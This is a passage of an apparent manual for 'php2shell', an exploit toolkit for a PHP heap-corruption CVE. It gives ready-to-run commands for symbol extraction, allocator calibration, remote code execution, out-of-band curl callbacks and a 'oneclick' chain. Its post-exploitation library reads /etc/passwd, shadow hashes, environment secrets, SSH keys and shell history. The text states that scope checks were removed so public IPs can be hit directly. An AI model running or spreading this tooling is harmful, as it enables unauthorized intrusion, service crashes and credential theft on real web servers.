`scan` / `batch` / `auto` all support these two parameters. In batch scenarios it is recommended to keep `--active-rounds 2`:
it can both push patched versions down to 15 and avoid causing too many worker crashes on the target.

### 15.3 Four-lab comparison (measured locally, 2026-10-23)

| Target | Version/config | Old criterion | New determination (active-rounds 2~3) |
|---|---|---|---|
| `127.0.0.1:8088` | PHP 8.2.12, `post_max>memory_limit` | LIKELY_RCE | **LIKELY_RCE** (active: crashed 3/3) |
| `127.0.0.1:8089` | PHP 8.2.35 (patched) | ~~LIKELY_RCE~~ (false positive) | **PREMISES_ONLY_UNVERIFIED** (no crash) |
| `127.0.0.1:8090` | PHP 8.4.26-apache | LIKELY_RCE | **RCE_READY** (read back proof after exploit) |
| `127.0.0.1:8091` | 8.4.26, 128M/8M production defaults | AFFECTED_DOS_ONLY | **AFFECTED_DOS_ONLY** |

### 15.4 proof verification: from "false negative" to readable-back

`exploit` / `auto` previously relied on "the proof file is locally visible" to determine success, whereas `-c 'id>/out/x'` writes
`/out/x` **inside the target container**, which the attacking side cannot see by default → the command clearly executed, yet stdout reported "exploit unsuccessful".
The v1.4 handling: use `--proof-dir` to **map the target-side directory to a locally readable directory**, with the determination order being

1. Command delivery + worker crash (strong evidence that the primitive works)
2. `--proof-dir DIR`: read `DIR/<basename>`, and only when the content matches `uid=` is it `RCE_READY`
3. cannot read → print "executed but proof cannot be read back in-band", give a `--proof-dir` usage hint, and **do not falsely report failure**

```bash
# correct usage when the container /out is already mounted to the host lab/out
python3 php2shell.py auto -u http://127.0.0.1:8090/ -c 'id>/out/a5' \
    --proof-dir /path/to/lab/out
# → proof: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 15.5 Command length and landing point

`MAX_CMD = 14` bytes, `id>/out/a5` = 10 bytes, safe. Writing a relative path into the webroot (`id>o`) is unreliable:
the Apache process cwd is not necessarily the DocumentRoot, and whether the webroot is 1777 depends on the image — do not use it for automated proof,
uniformly use `--proof-dir` to map an absolute path.


---

## 16. Cross-version attack capability: symbol derivation + calibration + post-exploitation command library (`attack/p2s_ext.py` v2)

> Goal: make the tool no longer "recognize only one particular PHP build". When switching versions it no longer relies on guessing, but is split into two stages: **deterministic derivation** and **measurable calibration**.

### 16.1 Why switching versions fails (three kinds of causes, which must be handled separately)

| Failure cause | Nature | Handling |
|---|---|---|
| `zif_system` / `zval_ptr_dtor` offset changes | **Deterministic** (a property of the build artifact) | read the target `libphp.so` symbol table, do not guess the version |
| `ht_size` (167B slot size) / `htdata_offset` (where the slot lands in the Zend MM chunk) | **Measurable** (allocator/heap history related) | use "command execution + HTTP readback" as the oracle for calibration |
| the tool's own stdout determination | engineering defect | always rely on HTTP readback / `--proof-dir` (fixed) |

### 16.2 `symbols`: determine offsets from the binary (no version guessing, no distro sniffing)

```bash
# local .so
python3 attack/p2s_ext.py symbols --elf labsym/libphp.so --out profiles/t.json
# extract directly from a container (automatically docker cp to the current directory)
python3 attack/p2s_ext.py symbols --docker php2shell-8426 --out profiles/t.json
```

Measured (two builds on the same machine, with completely different offsets — showing that "look up a table by version number" is unreliable):

```
PHP 8.2.12 (bookworm)  zif_system=0x398ec0  zval_ptr_dtor=0x4807d0
PHP 8.4.26 (trixie)    zif_system=0x465370  zval_ptr_dtor=0x65eb60
```

If the binary is stripped (symbols not found) → exit code 4, hinting to fall back to the `calibrate` blind search.

### 16.3 `calibrate`: calibrate only the genuinely unknown allocator parameters

```bash
# single-point verification (hit directly with a known profile)
python3 attack/p2s_ext.py calibrate -u http://127.0.0.1:8090/ \
    --profile profiles/p8426.json --rounds 8 --tries 2
# small-window grid (ht_size × htdata_offset)
python3 attack/p2s_ext.py calibrate -u http://127.0.0.1:8090/ \
    --ht-size-lo 159 --ht-size-hi 175 --htdata-window 0x680000:0x6A0000 --htdata-step 0x100
```

There is only one oracle: **after command execution, HTTP readback of the marker file returns 200 and is not the 404 page** (it counts as a hit only when both hold). On a hit it writes `profiles/<host>_<port>_<ht_size>.json` and exits with code 0; if all fail it exits 15 and prints the failure stage of each group (stage1/stage2/stage3), so you can directly tell whether it is a precondition, leak or layout problem.

**Cross-validation of leak correctness (strongly recommended to do once)**: compare `cat /proc/1/maps` inside the container with the Stage-1/2 leak values.
Locally measured `libphp_base=0x7ffff680e000` is **completely identical** to
`7ffff680e000-7ffff6964000 r--p ... /usr/lib/apache2/modules/libphp.so` in `/proc/1/maps` →
proving that the Stage-2 leak and the `zif = libphp_base + zif_offset` calculation are correct, and the problem can only be in `htdata`.

### 16.4 Success rate and retries (measured data, be sure to set parameters accordingly)

- Single round (one pollution→dereference) success rate measured at about **1/6 ≈ 17%**, a single round takes about **2.5s** (8090, sample n=6).
- Therefore: `--rounds 8` is about 67% for one attempt, about **96%** together with `--tries 3`; `--rounds 20` is about 97%.
- There was once a misjudgment of "build drift causing failure" due to `--rounds 1~2` — **all misses at low rounds cannot be used as evidence of failure**.
- One successful empirical case (8090, `--rounds 6`):
  `id>zr6` → `GET /zr6` = 200, `uid=33(www-data) gid=33(www-data) groups=33(www-data)` (54B, owner=www-data).

### 16.5 False negative fix (`php2shell.py` exploit wrap-up)

The engine may also show `deref B=0B` on success (peer reset), and the old logic printed "failure" and exit 30 based on that — but the command **had already executed**.
A readback check has now been added at the end of `run_exploit()`: when the command contains a `>name` redirection, it automatically does `GET /name`, and if 200 and not 404 it judges success and prints
`readback of name succeeded (NB)`, exit code 0. Measured `--rounds 8` three times in a row all exited 0.

### 16.6 `postex`: attack action library after RCE (19 entries, all ≤14 bytes)

The hard limit on command length is 14B (`ht_size 167 − 0x98 − 1`), so the library entirely uses short-name redirection and glob compression:

| key | command | purpose |
|---|---|---|
| id | `id>i` | process identity |
| whoami | `whoami>w` | user |
| uname | `uname -a>u` | kernel/distro (privilege escalation precondition) |
| hostname | `hostname>hn` | host/container id |
| env | `env>e` | environment variables: DB, cloud AK/SK, proxy, token |
| passwd | `cat /etc/p*>p` | account list |
| hosts | `cat /etc/ho*>hs` | internal network topology |
| shadow | `cat /etc/sh*>sh` | password hashes (requires root) |
| ps | `ps>ps` | process table |
| ip | `ip a>ip` | network interfaces/subnets |
| ss | `ss -an>ss` | listening ports |
| lsroot | `ls -l />lr` | root directory permissions |
| lsetc | `ls /etc>le` | /etc listing |
| lsrec | `ls -R /var>lv` | recursive application config |
| bashhist | `cat ~/.b*>hb` | command history (often plaintext passwords) |
| sshkey | `cat ~/.ssh/*>sk` | SSH private keys |
| crontab | `crontab -l>ct` | scheduled tasks |
| dockersock | `ls /var/run>vr` | whether docker.sock is mounted |
| logs | `cat /var/*/*>lg` | log fragments (visibility determination) |

Usage:

```bash
python3 attack/p2s_ext.py postex -u http://127.0.0.1:8090/ --rounds 8 --tries 3
python3 attack/p2s_ext.py postex -u http://127.0.0.1:8090/ --only id,env,passwd
python3 attack/p2s_ext.py postex -u http://127.0.0.1:8090/ --cleanup   # clear the marker files
```

Output: `postex_out/<key>` (raw bytes), `postex_out/report.json` (per-entry status/bytes/credential hints), and when a credential-type regex hits it marks `⚠ credential hint`.

**Measured (8090, PHP 8.4.26, www-data)**:
```
id        OK  54B    uid=33(www-data) gid=33(www-data) groups=33(www-data)
passwd    OK  2219B  root:x:0:0:root:/root:/bin/bash
lsrec     OK  ~20KB  /var recursive listing
lsroot    OK  1046B  root directory permissions
uname     OK  121B
dockersock OK 13B
```

### 16.7 Cross-version negative results (equally important)

- **PHP 8.2.12 (8088)**: symbols can be obtained exactly (zif=0x398ec0/dtor=0x4807d0, and both the 64M/8M preconditions and upload_progress are satisfied), but
  `--stage1-n 12/25/40` all result in **Stage-1 leak failure** → under this build the technique **lacks an infoleak primitive**, and can only cause worker crashes (DoS),
  and cannot complete the RCE chain. The tool's handling of this: `calibrate` prints the failure stage after each group, and continuous stage1 failures should be judged as "leak unavailable" rather than continuing the blind scan.
- **PHP 8.4.26 + 128M/8M (8091)**: `post_max_size < memory_limit` makes the dangling precondition after rfc1867 disappear → DoS only.

### 16.8 Guardrail

Scope validation has been removed: `symbols/calibrate/postex` no longer check the target network range, and public IPs can be used directly.
The post-exploitation library **does not contain** persistence, lateral movement, or log-clearing actions (14B is also physically impossible).


### 16.9 Command capacity = f(ht_size): 14B is not the ceiling

Both `php2shell.py` and `p2s_ext.py` compute the single-command capacity as `cap = ht_size - 0x98 - 1`; what `--ht-size` changes is not just the "heap slot", it directly determines how long post-exploitation commands can be:

| ht_size | cap | representative commands that fit |
|---|---|---|
| 167 (default/verified) | 14B | `id>i`, `cat /etc/p*>p`(13B), `id>/out/i`(10B) |
| 191 | 38B | `cat /etc/passwd>/o/pw`(21B), `ls -R /var>/o/lv`(17B), `crontab -l>/o/ct`(16B), `cat ~/.ssh/*>/o/sk`(19B) |
| 223 | 70B | `find / -perm -4000 -type f>/o/su`, `cat /etc/passwd /etc/shadow>/o/pw` |

**Cost (must know)**: `ht_size` is also the slot size of the forged HashTable, so **changing it requires recalibrating `htdata_offset`** (different size class → different Zend MM bin → the landing points of the 15 carrier strings shift as a whole). This lab measured `ht_size=167` corresponding to `htdata_offset=0x690D8`; other ht_size values need another `calibrate`. The tool has already wired up the capacity calculation and the `--dir/--local-dir` channel, so long commands can be used directly once calibration hits.

### 16.10 Readback channel: relative paths are **unreliable**, the absolute directory channel is the right answer

This lab (container `p2s_clean`, image `php2shell-lab:8426`) measured the difference between the two channels:

| Channel | Command | Result |
|---|---|---|
| relative (expected to land in docroot) | `id>w1` / `id>c1` / `id>c2` / `id>c3` / `id>q82` + `--rounds 8~24` | **all failed**: `docker exec ls /var/www/html` shows only `index.php`, HTTP `GET /w1` = 404 |
| absolute (bind mount) | `id>/out/w2`, `id>/out/k1`…`k6`, `env>/out/e`, `pwd>/out/c`, `ip a>/out/ip`, `ps>/out/ps`, `ss -an>/out/ss` | **all succeeded**: inside the host `lab/out/` 54B~1071B, `owner=www-data`, content `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, `pwd=/var/www/html`, env 1071B |

Conclusion: exploitation executes commands on the **shutdown/longjmp path**, and at that point the process cwd is not guaranteed to equal the script directory (even though the `pwd` probe echoes `/var/www/html`), so **relative redirection silently lands nowhere**. Engineering-wise you must:

```bash
# first probe to confirm execution + channel (absolute directory)
python3 attack/php2shell.py exploit -u http://127.0.0.1:8092/ -c "pwd>/out/c" \
  --htdata-offset 0x690D8 --ht-size 167 --rounds 8
# then run the command library over the absolute channel (--local-dir must point to the same physical directory as --dir inside the container)
python3 attack/p2s_ext.py postex -u http://127.0.0.1:8092/ \
  --dir /out --local-dir ../../lab/out --rounds 6 --tries 2
```

**Measured hit rate (absolute channel, rounds=8)**: 6 consecutive `--rounds 8` all hit (`k1`~`k6`, 6/6). The previously recorded "cooldown period 0/6, rounds=24 all miss" was **a bug in our own criterion**: `--local-dir` was written as `../lab/out` (relative to the toolkit directory, pointing to a nonexistent `deliver/lab/out`), the command had in fact executed and written to disk, it was just that the oracle kept looking for the file in the wrong directory. Lesson: **the readback directory must be the same physical path as the write directory inside the container, and the criterion must be able to distinguish "file does not exist" from "wrong path"** (the tool now supports `--dir/--local-dir`, and clears stale files with the same name before each attempt, to avoid stale files causing false hits).


#### 16.10.1 `--proof-dir` is mandatory (otherwise the absolute channel is judged fail)

Files written by the absolute directory channel are not in the webroot, so the tool's final "HTTP readback" naturally cannot fetch them, and it gives a **false negative** of `exit 30 (SAFE)`. Measured:

```bash
# without --proof-dir: the proof file has been generated, but the exit code is 30
python3 attack/php2shell.py exploit -u http://127.0.0.1:8092/ -c "id>/out/ctl" ... --rounds 8     # rc=30
# with --proof-dir: the same command rc=0 and prints RCE success
python3 attack/php2shell.py exploit -u http://127.0.0.1:8092/ -c "id>/out/pd1" ... --rounds 8 \
  --proof-dir ../../lab/out                                                                        # rc=0
--- proof ---
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### 16.10.2 `ht_size` is not a free knob (negative result, important)

To relax the 14B limit, measurements swept `ht_size=191`, `htdata_offset ∈ [0x50000, 0x7A000] step 0x800` (85 candidates, each `--rounds 3`, absolute channel + stale file cleanup) → **0/85 all miss**;
within the same minute, a control run with `ht_size=167 / htdata=0x690D8 / --rounds 8` → **one hit** (`/out/ctl` 54B, `uid=33`).

Conclusion: on this build (8.4.26 / Debian trixie / Apache 2.4.69) `ht_size=167` is the **only usable slot size**, and it is strongly coupled with the layout of the forged HashTable;
with 191 the 15 carrier strings fall into different size classes, and even shifting `htdata_offset` cannot assemble a usable `pData`/`pDestructor` structure.
Therefore **the 14B command cap is the actual ceiling of this build**, and long commands (`cat /etc/passwd>/o/pw` 21B etc.) are unreachable on this build — this is a physical constraint, not an implementation defect.
If 191/223 is calibrated as usable on another build, the capacity calculation of `p2s_ext.py` (`cap = ht_size - 0x98 - 1`) and the `--dir/--local-dir` channel adapt automatically, with no code changes.

### 16.11 Capability boundary after the attack code was added to the tool (honest conclusion)

- What it can do: arbitrary **≤cap** command execution (cap follows `ht_size`; **on this build only 167 works in measurement → actual cap=14B**); arbitrary file read at the `/etc/passwd` level; environment variables/processes/network/listening/directory listings; results land in a readback-able location via the absolute directory channel.
- What it cannot do (physical limits, not missing implementation): it cannot write a WebShell/reverse shell/cron persistence/clear logs within the 14B budget; these require `ht_size≥223` and successful calibration, and **this project explicitly does not do persistence, lateral movement, or log clearing**, so it is not implemented.
- Therefore the tool's positioning: **vulnerability verification + minimal post-exploitation forensics**, no persistence or lateral movement.

## 17. Real-World Public Network Usage Guide (Written-Authorization Targets Only)

> This section is for scenarios that put the tool against real websites/public IPs. **Iron rule up front: obtain written authorization first (scope + time window + contacts + data handling), otherwise do not send a single OOM probe packet**. Every OOM primitive in this tool kills the worker outright, so this is a test behavior that is noticeable and can degrade service.

### 17.1 Why lab parameters cannot be moved straight to the public network

| Difference | Lab (this repo, 8090/8092) | Real public target | Consequence and mitigation |
|---|---|---|---|
| ASLR | Host `randomize_va_space=0`, addresses constant | Enabled by default | Leaked values differ every time; Stage-1/2 must both complete inside the **same keep-alive connection**, with two consistency checks |
| `ht_size` | 167 (the only usable value measured for this build) | Unknown, depends on the Zend MM request allocation sequence | Calibrate with `calibrate`; use `--collab` when there is no readback channel (see 17.4) |
| `htdata_offset` | `0x690D8` | Unknown | Same as above; window scan + callback oracle |
| `zif/dtor` offsets | `0x465370` / `0x65EB60` (8.4.26 trixie) | Varies with version/build/compile options | Must re-acquire with `p2s_ext.py symbols --docker <container>:/path/libphp.so` or `--elf`; **do not hardcode** |
| Readback channel | Has an `/out` bind mount (1777) | Usually none; webroot read-only or unpredictable | Drop `--proof-dir` and use `blind` (out-of-band callback) for forensics |
| MPM/runtime | Apache prefork + mod_php | nginx+fpm / apache event / alpine container, etc. | Under event/threaded models the dangling window differs and the hit rate drops; fpm needs separate evaluation (not covered by this tool) |
| WAF/CDN | None | Common | Many parts or overlong headers get blocked; probe read-only with `fingerprint` first, then increase volume in small steps |
| Blast radius | Local container, rebuilt as needed | Production traffic | Must agree on a time window, a rate limit, and "how to stop once it goes down" |

**Conclusion**: On real targets the "parameters" almost certainly have to be re-calibrated; the value of the tool is turning this step into a repeatable process, not firing 167/0x690D8 straight at the target.

### 17.2 Out-of-band (OOB) blind verification: the only hard evidence when there is no readback channel

Real sites often have no writable directory, so the `--proof-dir` path is a dead end. The tool offers two blind verification channels:

1. **OOB callback (recommended, measured)**: make the target itself send a short HTTP request to your collaboration endpoint.
   ```bash
   # The target must be able to resolve the collab hostname (via /etc/hosts or public DNS)
   python3 attack/p2s_ext.py blind -u https://target/ --collab cb.example.com:9000 --token p1 --rounds 8
   ```
   On a hit the output looks like:
   ```
   [+] callback received: path=/p1 ip=203.0.113.10 ua=curl/8.14.1
   ```
   Forensic value: the token in `path` proves the request came from the command we injected, `ip` proves the outbound source is the target host, and `ua` lets us infer the curl version on the target side. Measured lab hit rate is about 20–50% per round (`--rounds 8` hits reliably).
2. **Timing side channel**: when the target cannot make outbound connections, `blind` degrades to a `sleep`-style criterion; it is noisy, so treat it only as corroborating evidence.
3. **Target-side log cross-check**: align callback requests with the target access log for the client to review (no fabrication, no deletion or modification).

**Note**: the callback port must be within the authorized scope, and you must not use anonymous proxy pools or third-party relays the tested party does not know about.

### 17.3 Authorization checklist (if one item is missing, do not test)

- [ ] Written authorization: target list (domain/IP/port/path), test type (including DoS tolerance), time window
- [ ] Technical contact + escalation path (how soon to stop after it goes down, who restarts it)
- [ ] Rate limit (suggested ≤1 req/s, with OOM-type requests throttled separately)
- [ ] Data handling: how captured memory/environment information is redacted, how long it is retained, who can access it
- [ ] Stop conditions: stop sending immediately on a surge of 5xx, latency degradation or a monitoring alert

Tool side: address-range validation has been removed, so public targets can be run directly; authorization responsibility rests entirely with the user.

### 17.4 Recommended order of operations (real targets)

```bash
T=https://target.example.com/

# 1) Read-only fingerprint (GET /, /index.php, /phpinfo.php…), determine whether the PHP version falls in the affected range
python3 attack/p2s_ext.py fingerprint -u $T

# 2) Precondition check: a dangling window exists only when post_max_size > memory_limit (built into the tool)
python3 attack/php2shell.py auto -u $T            # outputs AFFECTED / LIKELY / DOS-ONLY etc.

# 3) Fetch symbols (get a libphp.so built the same as the target; the path inside a container image is usually /usr/lib/apache2/modules/libphp.so)
python3 attack/p2s_ext.py symbols --docker <container>:/usr/lib/apache2/modules/libphp.so
python3 attack/p2s_ext.py symbols --elf ./libphp.so --out profile.json

# 4) Calibrate allocator parameters: a directory oracle with a readback channel; a callback oracle without one
python3 attack/p2s_ext.py calibrate -u $T --profile profile.json --collab cb.example.com:9000 --rounds 8

# 5) Blind-verify RCE (do not write a webshell first, first prove one command can execute)
python3 attack/p2s_ext.py blind -u $T --collab cb.example.com:9000 --token p1 --rounds 8

# 6) Minimal post-exploitation forensics (only within the authorized scope, command length is limited by cap)
python3 attack/p2s_ext.py postex -u $T --profile profile.json --dir /out --local-dir ./out
```

### 17.5 Hard constraints on command capacity and collaboration-endpoint length

`cap = ht_size − 0x98 − 1` (167 for this build → **14B**). This directly constrains how the callback is written:

| Form | Length | Feasible (cap=14) |
|---|---|---|
| `curl h:9000` | 11B | ✅ (lab-measured hit) |
| `curl h:9000/` | 12B | ✅ |
| `curl h:9000/p1` | 14B | ✅ (borderline, measured hit) |
| `curl cb.example.com:9000/p1` | 28B | ❌ → you must first give the target a **short hostname** (e.g. `/etc/hosts` or a short domain `cb.x/A`) |
| `curl https://cb.example.com/p1` | 30B | ❌ |

So on real targets, either (1) use HTTPS with a very short domain + short path (`curl a.co/p`=12B works), or (2) use `getent hosts <shortname>` (13B) over DNS out-of-band (requires your own authoritative DNS record). **Builds with a larger cap (ht_size 223 → 70B) have much more room** and can use the full URL `curl https://cb.example.com/xxx`.

### 17.6 Capability boundaries (an honest conclusion)

- Can do: version/precondition checks, unauthenticated RCE (on affected builds with `post_max_size > memory_limit`), OOB blind proof, short-command post-exploitation (read files/list directories/environment variables/processes/network state).
- Cannot do: write a webshell, reverse shell, persistence, log clearing, long commands (limited by cap), cross-MPM (fpm/event not covered), generic WAF bypass techniques.
- The hit rate is not 100%: `--rounds ≥ 8` is required, and multiple rounds inside the same process are far better than "a new connection every round" (the tool already implements it this way).

---

> Just want to "run it all with one command"? See §18 `oneclick`: fingerprint → preconditions → calibration → exploitation/blind verification → post-exploitation → report, all automatic.

## 18. Fully automatic in one command: `oneclick` (detection → exploitation → post-exploitation)

Goal: **no manual parameter juggling at all**. Given a URL + one forensics channel (out-of-band callback or writable directory),
the tool automatically performs: read-only fingerprint → precondition check → profile selection (including cap computation) → calibration (optional)
→ exploitation / blind verification → post-exploitation (optional) → structured report.

### 18.1 Minimal usage

```bash
# A) Has an out-of-band callback channel (preferred on the public network, the target needs no writable directory)
python3 attack/p2s_ext.py oneclick -u https://target/ \
    --collab cb.example.com:9000 --token p1 --listen --rounds 8 \
    --outdir out_target

# B) The target has a writable directory + local readback is possible (lab/intranet)
python3 attack/p2s_ext.py oneclick -u http://127.0.0.1:8090/ \
    --dir /out --local-dir ../../lab/out --rounds 8 --outdir /tmp/oc8090

# C) Fully automatic enhanced version: first calibrate htdata_offset via callback, then fire blind, then post-exploitation forensics
python3 attack/p2s_ext.py oneclick -u https://target/ \
    --collab cb.example.com:9000 --token p1 --listen --calibrate \
    --postex --only id,env,ps --rounds 8 \
    --outdir out_target
```

Read-only pre-check (completely non-offensive, can be run against any target first):

```bash
python3 attack/p2s_ext.py fingerprint -u https://target/     # only GETs 5 common paths
```

### 18.2 Internal flow (5 steps)

| Step | Action | Failure/early-exit behavior |
|---|---|---|
| 1 | `php2shell.py scan --json`: fingerprint, `session_start()` sink, `post_max_size` vs `memory_limit`, header bomb upper bound | SAFE/PATCHED→30; UNREACHABLE→50; NO_SINK→40; version above the fixed threshold→30 (**no OOM probing at all**); DoS only→20; preconditions only→15 |
| 2 | Profile selection: `--profile` > built-in `PROFILE_DB` (by PHP version) > CLI override; also computes `cap = ht_size − 0x98 − 1` | This build is known to have no infoleak primitive (`rce_ok=False`)→ 20, without wasting traffic |
| 3 | Channel decision: `--collab` present → blind verification; `--dir`+`--local-dir` present → write-back verification; neither → 10 with a hint | With `--calibrate`, the callback oracle first calibrates `htdata_offset` |
| 4 | Attack: `exploit` (with automatic `--proof-dir` validation) or `blind` (automatic listener, candidate commands filtered by cap) | Forensics commands converge on cap automatically (default `id><dir>/oNNN`, falling back to `id><dir>/o` when too long) |
| 5 | With `--postex`, automatic post-exploitation forensics (cap-aware command library, `--only` selects an optional subset) | Report goes to `--outdir` |

Artifacts: `<outdir>/scan.json`, `exploit.log` or `blind.log`, `profile_cal.json` (when calibrating),
`postex/` (with `--postex`), `oneclick_report.json` (with verdict / rce / exit / per-step rc).

### 18.3 Exit codes

| exit | Meaning |
|---|---|
| 0 | **RCE_READY**: execution evidence obtained (proof file contents or an OOB callback hit) |
| 10 | LIKELY: preconditions met but the forensics channel is missing (add `--collab` or `--dir/--local-dir`) or no hit this round |
| 15 | PREMISES_ONLY: only the preconditions were proven, no exploitation performed |
| 20 | AFFECTED_DOS_ONLY: can OOM, but this build has no infoleak → DoS only |
| 30 | SAFE / PATCHED: version already fixed or no sink |
| 40 | NO_SINK: no `session_start()` sink |
| 50 | UNREACHABLE: target unreachable |

### 18.4 `PROFILE_DB` coverage and extension

Built in (all measured on this machine):

| Version | ht_size | htdata | zif | dtor | stage2_t | Verdict |
|---|---|---|---|---|---|---|
| 8.4.26 (php:8.4.26-apache, Debian trixie) | 167 | 0x690D8 | 0x465370 | 0x65EB60 | 406 | **RCE works**, cap=14B |
| 8.2.12 (NTS, prefork) | 167 | 0x690D8 | 0x398EC0 | 0x4807D0 | 406 | Stage-1 always fails → DoS only |

Three steps to extend to a new build (all are required):

```bash
# 1) Fetch symbol offsets (read-only, any libphp.so with the same name will do)
python3 attack/p2s_ext.py symbols --elf /path/to/libphp.so
# 2) Calibrate allocator parameters with the callback oracle (the target must be reachable + callbacks reachable)
python3 attack/p2s_ext.py calibrate -u https://target/ --collab cb:9000 \
    --ht-size 167 --htdata-window 0x68000:0x6A000 --rounds 8 \
    --out profiles/<ver>.json
# 3) Register in the external profile library profiles.json (see 18.5); after that oneclick needs no manual parameters
```

### 18.5 External profile library `profiles.json`

The built-in `PROFILE_DB` only contains versions measured on this machine; other builds need no code change, just a JSON file to extend it.

**Search order (first hit wins, the built-in one always takes priority)**

1. `<package root>/profiles.json`
2. `~/.php2shell/profiles.json`
3. `./profiles.json` (current working directory)

A version with the same name (e.g. `8.4.26`) that appears in an external file **does not override** the built-in entry; it only takes effect for versions the built-in set does not have.
The loader coerces types: hex strings (`"0x690D8"`) and decimal strings are both converted to int; a missing field or an invalid value skips that entry with a warning and does not affect the other entries.

**File format** (top level keyed by "PHP version")

```json
{
  "8.4.27": {
    "ht_size": 167,
    "htdata_offset": 430296,
    "zif_offset": 4608880,
    "dtor_offset": 6679392,
    "stage2_t": 406,
    "rce_ok": true,
    "label": "8.4.27 (docker:php2shell-8427)"
  }
}
```

| Field | Meaning | Source |
|---|---|---|
| `ht_size` | Size of the fake HashTable (determines cap = ht_size − 0x98 − 1) | Calibration |
| `htdata_offset` | Offset of the HashTable data area relative to the libphp base in the target process | Calibration |
| `zif_offset` | `zif_system` offset (where the fake pDestructor lands) | `symbols` |
| `dtor_offset` | `zval_ptr_dtor` offset | `symbols` |
| `stage2_t` | Number of headers used for a Stage-2 hit (differs per version) | Calibration |
| `rce_ok` | Whether this build was measured to be exploitable; `false` = DoS only, and oneclick degrades to exit 20 | Manual/measured |
| `label` | Human-readable note, for display only | Any |

**Generation (no hand-writing needed)**

```bash
# A. Auto-detect from local docker containers (recommended; with no new images locally it only covers existing container versions)
tools/build_profiles.sh                      # automatically scans php2shell* containers and writes profiles.json

# B. Specify container/ELF + version
tools/build_profiles.sh --out profiles.json --from-docker 8.4.26=php2shell-8426
python3 tools/build_profiles.py --out profiles.json \
    --from-elf 8.4.27=/path/to/libphp.so --stage2-t 406 --rce-ok true

# C. Dry run, no writing
python3 tools/build_profiles.py --from-docker 8.4.26=php2shell-8426 --dry-run
```

`symbols` can only provide `zif_offset` / `dtor_offset` / `ht_size` / `htdata_offset`; `stage2_t` and `rce_ok` must be backfilled from actual `calibrate`/`oneclick` measurements (`--stage2-t` / `--rce-ok`). **Do not write unmeasured versions into the library**, otherwise builds that are "AFFECTED but cannot be exploited" get mislabeled as RCE-capable.

**Validation**

```bash
python3 - <<'EOF'
import json;d=json.load(open("profiles.json"));print(len(d),"profiles:",list(d))
EOF
python3 attack/p2s_ext.py oneclick -u http://127.0.0.1:8090/ --rounds 4 --tries 2 --force \
    --outdir /tmp/prof_check | tail -3   # the log should show profile=db:8.4.26 or file:8.4.26
```

### 18.6 Usage boundaries (must be observed)

- Public network/unauthorized assets: the code no longer blocks public targets, but real targets must have **written authorization**;
  run the read-only `fingerprint`/`recon` checks first, then decide whether to `oneclick`.
- This chain triggers by **creating an OOM**: on a production site that means worker crashes/resource churn.
  The authorized scope should explicitly permit it, and you should run read-only `fingerprint` checks first to avoid firing blind.
- Command capacity is decided by `ht_size` (14B for this build): no webshell writing, no reverse shell,
  no persistence; post-exploitation does only minimal forensics (`id`/`env`/`ps`/reading system files).
- No implanting, lateral movement, trail clearing or anonymization; logs always leave traces (recorded in both access and error logs).

## 19. Real-target zero-mount usage: `--http-read` (write webroot + HTTP readback)

In the previous 18 sections the `exploit` acceptance relied on `--proof-dir` (a host-mounted directory). Real targets have no mount, and `--http-read` provides an equivalent channel.

**Principle**: the PHP process `cwd` is usually the webroot (Apache/mod_php + `DocumentRoot`),
so dropping to disk with a **relative path** in the command (`id>p123`) writes to `DocumentRoot/p123`, which is then read back with a plain `GET /p123`.
No need for the target to be able to write outbound, no mount, no blind callback infrastructure.

```bash
# single-command level (relative write + readback)
python3 attack/p2s_ext.py oneclick -u https://target/ --http-read https://target/ \
    --rounds 8 --tries 2 --force --postex --only id,env,ps \
    --outdir out
```

Key points (all from actual tests):

| Point | Notes |
|---|---|
| webroot writable | If `www-data` has no write permission on `DocumentRoot` the whole chain fails (rc may still be 30/20, which does not mean it is safe) |
| `cwd == webroot` | If the application has called `chdir()`, the relative write landing point changes → switch to an absolute path + outbound callback (`--collab`) |
| Command length ≥6B | Measured: `< 6B` commands (such as `id>i`) have a very low hit rate; the tool already uses `_pad_cmd()` to pad the on-disk name, which is why `postex` went from NO_EFFECT to usable |
| Command cap | `cap = ht_size − 0x98 − 1`, which is **14B** on 8.4.26-trixie; over-long commands are detected and downgraded by the tool, so no webshell / reverse shell / persistence |
| `--force` | When `scan`'s OOM probe is judged `PREMISES_ONLY_UNVERIFIED` (the target has already been hit with OOM, or the probe is rate-limited) it exits early with 15; if you know the preconditions hold (`post_max_size > memory_limit` + a `session_start()`) you can pass `--force` to go straight into the attack |
| `--tries` | retries per command for `postex` (default 3). The measured single-round success rate is about 1/6, so it is only stable together with `--rounds 8` |

Trade-offs between the three readback channels:

1. `--collab cb.host:9000 --token p1 --listen` — most general: the target **does not need a writable directory**, only outbound network (`curl`/`fsockopen` both work). First choice on the public internet.
2. `--http-read BASE` — the target **does not need outbound network**, but needs a writable webroot + correct cwd. First choice on intranets / when outbound is blocked by an ACL.
3. `--dir /abs/path --local-dir ./mnt` — only for lab/container mount scenarios (the lab usage in this repo); unusable on real targets.

## 20. Generic web scanning has been removed entirely (this tool only does CVE-2026-109618)

This tool **targets CVE-2026-109618 only** and no longer has any generic web vulnerability scanning capability:

| Removed | Status |
|---|---|
| `extras/legacy-webscan/webscan.py` | **Deleted** from the source tree (not moved); this file is absent from both the delivery package and the source copy |
| SQLi / XSS / CSRF / LFI / CMDi detection | All code paths removed; no injection-style scanning logic exists under `attack/` |
| GUI generic scan mode | The frontend only has `recon` (four-precondition classification) and `oneclick` (the 109618 exploitation chain) |
| Params such as `max_urls / max_params / forms / safe / fingerprint` | The server-side opts allowlist has been removed, so passing them has no effect |

> Rationale: whether this CVE can be exploited is decided only by four preconditions (affected version / `post_max_size > memory_limit` /
> the entry point calling `session_start()` / calibratable heap), and is **completely unrelated** to whether the target has SQLi or XSS.
> Keeping generic scanning would only mix unrelated findings into the CVE report and mislead the "can it RCE" verdict.

`poc_eness/poc_109618.py` **cannot be stripped out**: `attack/php2shell_rce.py` depends on it hard
(`import poc_109618 as P`, using `P.Target / P.build_multipart / P.parse_cookie /
P.chunk_base_from_cookie / P.libphp_base_from_cookie / P.Exploit`),
and `p2s_ext.py` in turn depends on `php2shell_rce`. Moving it away breaks the whole `oneclick` chain.

## 21. GUI: CVE-2026-109618 detection and exploitation console (dual mode)

```bash
python3 gui/server.py --host 127.0.0.1 --port 8899
# open http://127.0.0.1:8899 in a browser
```

**Two modes (radio buttons on the page, recon by default)**

| Mode | Engine call | Traffic nature | Verdict values | Gate |
|---|---|---|---|---|
